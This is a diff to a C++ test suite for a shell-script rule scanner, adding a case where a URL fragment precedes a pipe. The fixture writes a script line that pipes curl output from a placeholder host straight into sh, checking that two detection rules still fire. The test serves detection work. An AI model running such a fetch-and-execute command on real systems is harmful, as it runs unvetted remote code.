@@ -1375,6 +1375,12 @@ SCENARIO("[feature:rule-engine] SH-QUAL-014 and SCA-063 ignore curl|sh in a comm
     auto loud = keur::rules_scan_files(rules, {code});
     CHECK(has_rule(loud, "SH-QUAL-014"));
     CHECK(has_rule(loud, "SCA-063"));
+    // A URL fragment is code, not a comment: the pipe after it must still be seen.
+    std::string frag = dir + "/fragment.sh";
+    write_file(frag, "#!/usr/bin/env bash\ncurl https://example.invalid/install.sh#v1 | sh\n");
+    auto hidden = keur::rules_scan_files(rules, {frag});
+    CHECK(has_rule(hidden, "SH-QUAL-014"));
+    CHECK(has_rule(hidden, "SCA-063"));
     cleanup_dir(dir);
 }
 
